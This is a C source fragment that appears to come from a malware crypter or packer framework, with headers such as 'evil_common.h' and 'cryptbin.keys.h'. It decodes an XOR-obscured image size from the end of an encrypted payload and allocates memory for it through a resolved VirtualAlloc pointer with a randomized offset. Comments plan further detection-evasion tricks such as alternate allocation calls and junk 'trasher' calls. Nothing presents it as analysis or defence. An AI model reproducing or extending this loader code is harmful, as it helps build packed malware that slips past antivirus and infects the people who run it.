//@@@headers
#include "alloc_valloc.h"
#include "locate.h"
#include "lpfns.h"
#include "evil_common.h"
#include "dbg.h"
#include "../cryptbin.keys.h" // CRYPTBIN_KEY for CachedSizeOfImage
//@@@endheaders

//@@@zvars
PVOID alloc_lpAlloc;
PVOID alloc_lpImage;
DWORD alloc_CachedSizeOfImage;
DWORD alloc_AllocSize;
//@@@endzvars


// A1D -> dwProtect
SPRAYABLE_PROC(alloc) {
  //@@@proc /name alloc
  Z(alloc_CachedSizeOfImage) = *(DWORD*)((DWORD_PTR)Z(locate_paydata) + Z(locate_paydatalen) - 4);
  Z(alloc_CachedSizeOfImage) ^= CRYPTBIN_TAIL_XORKEY;

  // #PossibleImprovements
  // 1)  | lpfnVirtualAllocEx, lpfnVirtualAllocExNuma, ...
  // 2)  | two calls:<reserve;commit>
  // 3)  | need trasher for VirtualXxx calls (meaningful)
  Z(alloc_AllocSize) = Z(alloc_CachedSizeOfImage) + PAGE_GRANULARITY*_fka(5, 10);
  Z(alloc_lpAlloc) = Z(lpfnVirtualAlloc)(0, Z(alloc_AllocSize), MEM_RESERVE | MEM_COMMIT, CUR_A1D); XASSERT(Z(alloc_lpAlloc));
  Z(alloc_lpImage) = (PVOID)((DWORD_PTR)Z(alloc_lpAlloc) + PAGE_GRANULARITY*_fkb(0, 5));
  CUR_RETD = 1; dbgprn("alloc_valloc: lpAlloc=%p lpImage=%p [CachedSizeOfImage=%x, AllocSize=%x]\n", Z(alloc_lpAlloc), Z(alloc_lpImage), Z(alloc_CachedSizeOfImage), Z(alloc_AllocSize));
  //@@@endproc
}

SPRAYABLE_PROC(dealloc) {
  //@@@proc /name dealloc
  Z(lpfnVirtualFree)(Z(alloc_lpAlloc), Z(alloc_AllocSize), MEM_DECOMMIT);
  Z(lpfnVirtualFree)(Z(alloc_lpAlloc), 0, MEM_RELEASE);
  //@@@endproc
}




